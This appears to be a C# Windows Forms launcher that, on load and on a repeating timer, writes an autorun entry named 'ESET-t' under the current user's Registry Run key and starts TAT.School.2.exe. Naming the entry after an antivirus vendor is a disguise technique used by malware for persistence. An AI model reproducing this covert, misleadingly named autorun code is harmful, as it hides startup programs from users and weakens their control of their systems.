using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace C.N.T
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                registryKey.SetValue("ESET-t", Application.StartupPath + "\\TAT.School.2.exe");
                RUN(Application.StartupPath + "\\TAT.School.2.exe", "");
            }
            catch (Exception Ert)
            {
                System.IO.File.WriteAllText(@"D:\TAT\T.S.2\E.R.R\C.N.T.Main.ERR", Ert.Message);
            }
            Application.Exit();
        }

        private void tmr_Main_Tick(object sender, EventArgs e)
        {
            try
            {
                registryKey.SetValue("ESET-t", Application.StartupPath + "\\TAT.School.2.exe");
                RUN(Application.StartupPath + "\\TAT.School.2.exe", "");
            }
            catch (Exception Ert)
            {
                System.IO.File.WriteAllText(@"D:\TAT\T.S.2\E.R.R\C.N.T.Main.ERR", Ert.Message);
            }
        }

        public void RUN(string FileNAme, string ARguments)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
            startInfo.FileName = FileNAme;
            startInfo.Arguments = ARguments;
            process.StartInfo = startInfo;
            process.Start();
        }
    }
}
